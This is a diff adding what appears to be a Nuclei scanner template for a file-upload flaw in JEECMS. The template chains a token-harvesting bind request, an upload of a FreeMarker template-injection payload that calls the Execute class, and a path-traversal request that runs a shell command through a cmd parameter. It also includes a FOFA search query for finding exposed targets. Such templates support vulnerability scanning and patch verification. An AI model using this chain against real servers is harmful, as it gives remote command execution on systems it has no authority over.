@@ -1,0 +1,83 @@
+id: jeecms-o_upload-fileupload
+
+info:
+  name: jeecms-o_upload-fileupload
+  author: unknow
+  severity: high
+  description: JEECMS o_upload 存在文件上传漏洞。
+  tags: JEECMS,fileupload
+  metadata:
+    fofa-qeury: 'banner="Set-Cookie: JIDENTITY=" || header="Set-Cookie: JIDENTITY=" || banner="JEECMS-Auth-Token" || header="JEECMS-Auth-Token" || body="jeecms" || body="/r/cms/www/default/js/front.js"'
+
+variables:
+  rand8: "{{rand_text_numeric(8)}}"
+
+http:
+  - raw:
+      - |              
+        POST /thirdParty/bind HTTP/1.1
+        Host: 
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 
+
+        {"username":"{{rand8}}","loginWay": 1, "loginType": "QQ", "thirdId": "{{rand8}}"}
+      - |
+        POST /member/upload/o_upload HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Length: 602
+        Content-Type: multipart/form-data; boundary=---------------------------1250178961143214655620108952
+        Jeecms-Auth-Token: {{token}}
+        Accept-Encoding: gzip
+        Connection: close
+
+        -----------------------------1250178961143214655620108952
+        Content-Disposition: form-data; name="uploadFile"; filename="a.html"
+        Content-Type: text/html
+
+        ${site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.ObjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.utility.Execute"), null)(cmd)}
+        -----------------------------1250178961143214655620108952
+        Content-Disposition: form-data; name="typeStr"
+
+        File
+        -----------------------------1250178961143214655620108952--      
+      - |
+        GET /..-..-..-..-..-u-cms-www-{{nian}}-{{wenjianming}}.htm?cmd={{rce}} HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0
+        Accept-Encoding: gzip
+        Connection: close      
+
+    extractors:
+      - type: regex
+        name: token
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - '\"JEECMS-Auth-Token\":\"(.*)\",\"siteId'
+
+      - type: regex
+        name: nian
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - '\"fileUrl\":\"/u/cms/www/(.*)/'
+
+      - type: regex
+        name: wenjianming
+        part: body
+        internal: true
+        regex:
+          - '[0-9a-z]{12}'                    
+
+    payloads:
+      rce:
+        - "cmd.exe%20/c%20echo%20123456qwer"
+
+    matchers:     
+      - type: dsl
+        name: rce
+        dsl:
+          - '(status_code==200) && contains(body, "123456qwer") && contains(header, "text/html")'
